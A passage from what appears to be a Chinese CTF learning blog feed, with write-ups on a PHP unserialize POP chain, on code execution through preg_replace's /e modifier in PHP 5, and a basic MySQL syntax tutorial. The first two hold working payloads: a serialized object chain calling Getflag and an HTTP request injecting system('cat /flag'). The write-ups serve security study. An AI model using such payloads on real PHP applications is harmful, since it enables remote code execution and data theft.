&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>首先观察一下整段代码，<code>w44m</code>类里面的<code>Getflag</code>函数可以用来读取flag，因此就将它作为这条链子的尾部。</p>
<p>再想一下如何去调用这个函数，<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</code>会调用函数，所以只需要给<code>$w00m</code>赋一个<code>w44m</code>类，然后再给<code>w22m</code>赋一个<code>Getflag</code>就能成功调用该函数。</p>
<p>还差谁？<code>w33m</code>。再考虑一下如何调用这个<code>w33m</code>类呢？<code>__toString()</code>方法会在一个对象被当作字符串时被调用，于是我们就能看到下面<code>w22m</code>这个类里面的<code>echo</code>函数。我们只要给<code>w00m</code>赋一个<code>w33m</code>类，就能调用。</p>
<p>构造exp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">    private $admin=&#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd=&#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new w22m;</span><br><span class="line">$a-&gt;w00m=new w33m;</span><br><span class="line">$a-&gt;w00m-&gt;w00m=new w44m;</span><br><span class="line">$a-&gt;w00m-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p>最终WP：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈 preg_replace 在 php5 版本下的命令执行</title>
    <url>/2024/04/04/preg_replace%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><code>preg_replace</code></h1><p>先来看看 <code>preg_replace</code> 的作用吧</p>
<p><code>preg_replace</code> 函数执行一个正则表达式的搜索和替换。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>

<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p>
<p>参数说明：</p>
<ul>
<li>$pattern：要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement：用于替换的字符串或字符串数组。</li>
<li>$subject：要搜索替换的目标字符串或字符串数组。</li>
<li>$limit：可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
<li>$count：可选，为替换执行的次数。</li>
</ul>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p>
<p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p>
<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$subject</span> = <span class="string">&#x27;google 123, 456&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\w+) (\d+), (\d+)/i&#x27;</span>;</span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&#x27;runoob $&#123;2&#125;,$3&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 输出为：</span></span><br><span class="line">runoob <span class="number">123</span>,<span class="number">456</span></span><br></pre></td></tr></table></figure>

<h5 id="正则："><a href="#正则：" class="headerlink" title="正则："></a>正则：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/(\w+) (\d+), (\d+)/i</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>第1个捕获组 (\w+):</strong><ul>
<li><code>\w</code> 匹配任何单词字符（相当于 <code>[a-zA-Z0-9_]</code>），即匹配字母（无论大小写）、数字和下划线。</li>
<li><code>+</code> 表示匹配前一个标记一次到无限次，尽可能多的匹配（贪婪匹配）。</li>
</ul>
</li>
<li><strong>第2个捕获组 (\d+):</strong><ul>
<li><code>\d</code> 匹配一个数字（相当于 <code>[0-9]</code>）。</li>
<li><code>+</code> 同样表示匹配前一个标记一次到无限次，尽可能多的匹配（贪婪匹配）。</li>
<li><code>,</code> 直接匹配字符“,”。</li>
</ul>
</li>
<li><strong>第3个捕获组 (\d+):</strong><ul>
<li><code>\d</code> 也是匹配一个数字。</li>
<li><code>+</code> 再次表示贪婪匹配。</li>
</ul>
</li>
<li><strong>全局模式标志:</strong><ul>
<li><code>i</code> 修饰符：不区分大小写。匹配时忽略 <code>[a-zA-Z]</code> 的大小写。</li>
</ul>
</li>
</ol>
<p>简单来说，这个正则表达式用来匹配格式如“单词 数字, 数字”的字符串，例如“March 24, 2023”，其中“March”会被第1个捕获组匹配，第一个“24”会被第2个捕获组匹配，而“2023”会被第3个捕获组匹配。<code>i</code>修饰符确保了单词的大小写不会影响匹配结果。</p>
<h5 id="replacement："><a href="#replacement：" class="headerlink" title="$replacement："></a><code>$replacement</code>：</h5><p><code>$&#123;2&#125;</code>和<code> $&#123;3&#125;</code></p>
<p>  是后向引用（ backreferences ），它们引用正则表达式中的捕获组。在这个正则表达式中，捕获组用括号<code>()</code></p>
<p>  定义：</p>
<ul>
<li>第一个捕获组<code>(\w+)</code>匹配一个或多个单词字符（这部分在替换文本中没有直接使用）。</li>
<li>第二个捕获组<code>(\d+)</code>匹配一个或多个数字，这是紧跟单词后的数字部分（例如<code>123</code>），并通过<code>$&#123;2&#125;</code>在替换文本中引用。</li>
<li>第三个捕获组<code>(\d+)</code>匹配另一组一个或多个数字，这是在逗号后的数字部分（例如<code>456</code>），并通过<code>$&#123;3&#125;</code>在替换文本中引用。</li>
</ul>
<h3 id="函数的几种匹配模式："><a href="#函数的几种匹配模式：" class="headerlink" title="函数的几种匹配模式："></a>函数的几种匹配模式：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加 /g 最多只会匹配一个</span><br><span class="line">/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同</span><br><span class="line">/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br><span class="line">/s 与 /m 相对，单行模式匹配。</span><br><span class="line">/e 可执行模式，此为 PHP 专有参数，例如 preg_replace 函数。</span><br><span class="line">/x 忽略空白模式。</span><br></pre></td></tr></table></figure>

<h4 id="e-模式"><a href="#e-模式" class="headerlink" title="/e 模式"></a><code>/e</code> 模式</h4><p> 函数还有一个 <code>/e</code> 模式。可以导致代码执行，是 <code>preg_replace()</code> 将 <strong>$replacement</strong> 当做 php 代码来执行</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="xyctf-的-warm-up-level-2："><a href="#xyctf-的-warm-up-level-2：" class="headerlink" title="xyctf 的 warm up level 2："></a>xyctf 的 warm up level 2：</h3><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<p>好像只要保证 a 是个正则，有 &#x2F;e 操作符就行了…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST //LLeeevvveeelll222.php?a=//e&amp;&amp;b=system(&#x27;cat+/flag&#x27;)&amp;&amp;c= HTTP/1.1</span><br><span class="line">Host: xyctf.top:45265</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Referer: http://xyctf.top:45265//LLeeevvveeelll222.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">Origin: http://xyctf.top:45265</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">a[]=1</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/07/6fVjqcMrEKJmtz7.png" alt="image-20240407153830343"></p>
]]></content>
      <categories>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>php 特性</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 语法学习记录</title>
    <url>/2024/04/23/Mysql%20%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前置准备："><a href="#前置准备：" class="headerlink" title="前置准备："></a>前置准备：</h2><ol>
<li>phpstudy 可以正常启动：</li>
</ol>
<p><img src="https://s2.loli.net/2024/04/23/HfIeUxajilcWQV4.png" alt="image-20240417150925056"></p>
<ol start="2">
<li><p>用 Navicat 连接至数据库：</p>
<p><img src="https://s2.loli.net/2024/04/23/KiXmGOAfwqP3gWJ.png" alt="image-20240417151319130"></p>
<p>密码默认为 root</p>
</li>
<li><p>新建查询即可</p>
<p><img src="https://s2.loli.net/2024/04/23/LC8NnAcJgoIVrjQ.png" alt="image-20240417151733346"></p>
</li>
</ol>
<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><p>注：MySQL 数据库大小写不敏感</p>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><ol>
<li><code>%</code>：表示零个或多个字符。</li>
<li><code>_</code>：表示单个字符。</li>
<li><code>[ ]</code>：用于指定一个字符集合，匹配其中任意一个字符。</li>
<li><code>[^]</code>：用于指定一个字符集合，匹配其中任意一个字符之外的字符。</li>
<li><code>|</code>：用于指定多个条件中的一个。</li>
<li><code>*</code>：表示“所有列”或“所有字段”，通常用在 SELECT 语句中</li>
</ol>
<h2 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h2><p>SELECT 语句用于从数据库中选取数据。</p>
<p>结果被存储在一个结果表中，称为结果集。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>column1, column2, …：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</li>
<li>table_name：要查询的表名称。</li>
</ul>
<h2 id="SELECT-DISTINCT-语句"><a href="#SELECT-DISTINCT-语句" class="headerlink" title="SELECT DISTINCT 语句"></a>SELECT DISTINCT 语句</h2><p>在表中，一个列可能会包含多个重复值，有时也许希望仅仅列出不同的值。</p>
<p>DISTINCT 关键词用于返回唯一不同的值。此时会去除重复的值。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT column1, column2, ...</span><br><span class="line">FROM table_name;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>column1, column2, …：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</li>
<li>table_name：要查询的表名称。</li>
</ul>
<h2 id="WHERE-子句"><a href="#WHERE-子句" class="headerlink" title="WHERE 子句"></a>WHERE 子句</h2><p>我们知道从数据表中使用 SELECT 语句来读取数据。</p>
<p>如需有条件地从表中选取数据，可将 WHERE 子句添加到 SELECT 语句中。</p>
<p>WHERE 子句用于在 sql 中过滤查询结果，只返回满足特定条件的行。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>column1, column2, …：是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li>table_name： 是你要从中查询数据的表的名称。</li>
<li>WHERE condition：是用于指定过滤条件的子句。</li>
</ul>
<p><strong>更多说明：</strong></p>
<ul>
<li>查询语句中你可以使用一个或者多个表，表之间使用逗号 ‘,’  分割，并使用WHERE语句来设定查询条件。</li>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
<li>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</li>
<li>WHERE 子句类似于程序语言中的 if 条件，根据数据表中的字段值来读取指定的数据。</li>
</ul>
<p>以下为操作符列表，可用于 WHERE 子句中。</p>
<p>下表中实例假定 A 为 10, B 为 20</p>
<table>
<thead>
<tr>
<th align="center">操作符</th>
<th align="center">描述</th>
<th align="center">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x3D;</td>
<td align="center">等号，检测两个值是否相等，如果相等返回 true</td>
<td align="center">(A &#x3D; B) 返回 false。</td>
</tr>
<tr>
<td align="center">&lt;&gt;, !&#x3D;</td>
<td align="center">不等于，检测两个值是否相等，如果不相等返回 true</td>
<td align="center">(A !&#x3D; B) 返回 true。</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回 true</td>
<td align="center">(A &gt; B) 返回 false。</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回 true</td>
<td align="center">(A &lt; B) 返回 true。</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回 true</td>
<td align="center">(A &gt;&#x3D; B) 返回 false。</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回 true</td>
<td align="center">(A &lt;&#x3D; B) 返回 true。</td>
</tr>
</tbody></table>
<h3 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h3><h4 id="等于条件："><a href="#等于条件：" class="headerlink" title="等于条件："></a>等于条件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;test&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="不等于条件："><a href="#不等于条件：" class="headerlink" title="不等于条件："></a>不等于条件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username != &#x27;runoob&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="大于条件"><a href="#大于条件" class="headerlink" title="大于条件:"></a>大于条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE price &gt; 50.00;</span><br></pre></td></tr></table></figure>

<h4 id="小于条件"><a href="#小于条件" class="headerlink" title="小于条件:"></a>小于条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date &lt; &#x27;2023-01-01&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="大于等于条件"><a href="#大于等于条件" class="headerlink" title="大于等于条件:"></a>大于等于条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM employees WHERE salary &gt;= 50000;</span><br></pre></td></tr></table></figure>

<h4 id="小于等于条件"><a href="#小于等于条件" class="headerlink" title="小于等于条件:"></a>小于等于条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM students WHERE age &lt;= 21;</span><br></pre></td></tr></table></figure>

<h4 id="组合条件（AND、OR）"><a href="#组合条件（AND、OR）" class="headerlink" title="组合条件（AND、OR）:"></a>组合条件（AND、OR）:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE category = &#x27;Electronics&#x27; AND price &gt; 100.00;</span><br><span class="line">SELECT * FROM orders WHERE order_date &gt;= &#x27;2023-01-01&#x27; OR total_amount &gt; 1000.00;</span><br></pre></td></tr></table></figure>

<h4 id="模糊匹配条件（LIKE）"><a href="#模糊匹配条件（LIKE）" class="headerlink" title="模糊匹配条件（LIKE）:"></a>模糊匹配条件（LIKE）:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM customers WHERE first_name LIKE &#x27;J%&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="IN-条件"><a href="#IN-条件" class="headerlink" title="IN 条件:"></a>IN 条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="NOT-条件"><a href="#NOT-条件" class="headerlink" title="NOT 条件:"></a>NOT 条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="BETWEEN-条件"><a href="#BETWEEN-条件" class="headerlink" title="BETWEEN 条件:"></a>BETWEEN 条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;;</span><br></pre></td></tr></table></figure>

<h4 id="IS-NULL-条件"><a href="#IS-NULL-条件" class="headerlink" title="IS NULL 条件"></a>IS NULL 条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM employees WHERE department IS NULL;</span><br></pre></td></tr></table></figure>

<h4 id="IS-NOT-NULL-条件"><a href="#IS-NOT-NULL-条件" class="headerlink" title="IS NOT NULL 条件:"></a>IS NOT NULL 条件:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM customers WHERE email IS NOT NULL;</span><br></pre></td></tr></table></figure>

<p>如果我们想在数据表中读取指定的数据，WHERE 子句是非常有用的。</p>
<p>使用主键来作为 WHERE 子句的条件查询是非常快速的。</p>
<p>如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据。</p>
<h2 id="LIKE-子句"><a href="#LIKE-子句" class="headerlink" title="LIKE 子句"></a>LIKE 子句</h2><p>我们知道使用 SELECT 命令来读取数据， 同时我们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。</p>
<p>WHERE 子句中可以使用等号 <strong>&#x3D;</strong> 来设定获取数据的条件。</p>
<p><strong>LIKE</strong> 子句用于在 WHERE 子句中进行模糊匹配的关键字。它通常与通配符一起使用，用于搜索符合某种模式的字符串。</p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column LIKE pattern;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>column1, column2, …：是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li>table_name：是你要从中查询数据的表的名称。</li>
<li>column：是你要应用 <code>LIKE</code> 子句的列的名称。</li>
<li>pattern：是用于匹配的模式，可以包含通配符。</li>
</ul>
<p><strong>更多说明：</strong></p>
<ul>
<li>你可以在 WHERE 子句中指定任何条件。</li>
<li>你可以在 WHERE 子句中使用LIKE子句。</li>
<li>你可以使用 LIKE 子句代替等号 &#x3D;。</li>
<li>LIKE 通常与 % 一同使用，类似于一个元字符的搜索。</li>
<li>你可以使用 AND 或者 OR 指定一个或多个条件。</li>
<li>你可以在 DELETE 或 UPDATE 命令中使用 WHERE…LIKE 子句来指定条件。</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>以下是一些 LIKE 子句的使用实例。</p>
<h4 id="百分号通配符-："><a href="#百分号通配符-：" class="headerlink" title="百分号通配符 % ："></a>百分号通配符 % ：</h4><p>% 通配符表示零个或多个字符。例如：’a%’ 匹配以字母 ‘a’ 开头的任何字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM customers WHERE last_name LIKE &#x27;S%&#x27;;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择所有姓氏以 ‘S’ 开头的客户。</p>
<h4 id="下划线通配符-："><a href="#下划线通配符-：" class="headerlink" title="下划线通配符 _ ："></a>下划线通配符 _ ：</h4><p><strong>_</strong> 通配符表示一个字符。例如，’_r%’ 匹配第二个字母为 ‘r’ 的任何字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE product_name LIKE &#x27;_a%&#x27;;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择产品名称的第二个字符为 ‘a’ 的所有产品。</p>
<h4 id="组合使用-和-："><a href="#组合使用-和-：" class="headerlink" title="组合使用 % 和 _ ："></a>组合使用 % 和 _ ：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE username LIKE &#x27;a%o_&#x27;;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将匹配以字母 ‘a’ 开头，然后是零个或多个字符，接着是 ‘o’，最后是一个任意字符的字符串，如 ‘aaron’、’apol’。</p>
<h4 id="不区分大小写的匹配："><a href="#不区分大小写的匹配：" class="headerlink" title="不区分大小写的匹配："></a>不区分大小写的匹配：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM employees WHERE last_name LIKE &#x27;smi%&#x27; COLLATE utf8mb4_general_ci;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择姓氏以 ‘smi’ 开头的所有员工，不区分大小写。</p>
<p>LIKE 子句提供了强大的模糊搜索能力，可以根据不同的模式和需求进行定制。在使用时，请确保理解通配符的含义，并根据实际情况进行匹配。</p>
<h2 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h2><p>我们知道从数据表中使用 <strong>SELECT</strong> 语句来读取数据。</p>
<p>如果我们需要对读取的数据进行排序，我们就可以使用 <strong>ORDER BY</strong> 子句来设定你想按哪个字段哪种方式来进行排序，再返回搜索结果。</p>
<p>ORDER BY 语句可以按照一个或多个列的值进行升序（<strong>ASC</strong>）或降序（<strong>DESC</strong>）排序。</p>
<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li>column1, column2, …：是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li>table_name： 是你要从中查询数据的表的名称。</li>
<li>ORDER BY column1 [ASC|DESC], column2 [ASC|DESC], …：是用于指定排序顺序的子句。</li>
<li><code>ASC</code> 表示升序（默认），<code>DESC</code> 表示降序。</li>
</ul>
<p><strong>更多说明：</strong></p>
<ul>
<li>你可以使用任何字段来作为排序的条件，从而返回排序后的查询结果。</li>
<li>你可以设定多个字段来排序。</li>
<li>你可以使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列。 默认情况下，它是按升序排列。</li>
<li>你可以添加 WHERE…LIKE 子句来设置条件。</li>
</ul>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>以下是一些 ORDER BY 子句的使用实例。</p>
<h4 id="单列排序："><a href="#单列排序：" class="headerlink" title="单列排序："></a>单列排序：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products</span><br><span class="line">ORDER BY product_name ASC;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择产品表 products 中的所有产品，并按产品名称升序 ASC 排序。</p>
<h4 id="多列排序："><a href="#多列排序：" class="headerlink" title="多列排序："></a>多列排序：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM employees</span><br><span class="line">ORDER BY department_id ASC, hire_date DESC;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择员工表 employees 中的所有员工，并先按部门 ID 升序 ASC 排序，然后在相同部门中按雇佣日期降序 DESC 排序。</p>
<h4 id="使用数字表示列的位置："><a href="#使用数字表示列的位置：" class="headerlink" title="使用数字表示列的位置："></a>使用数字表示列的位置：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name, salary</span><br><span class="line">FROM employees</span><br><span class="line">ORDER BY 3 DESC, 1 ASC;</span><br></pre></td></tr></table></figure>

<p>以上 SQL 语句将选择员工表 employees 中的名字和工资列，并按第三列（salary）降序 DESC 排序，然后按第一列（first_name）升序 ASC 排序。</p>
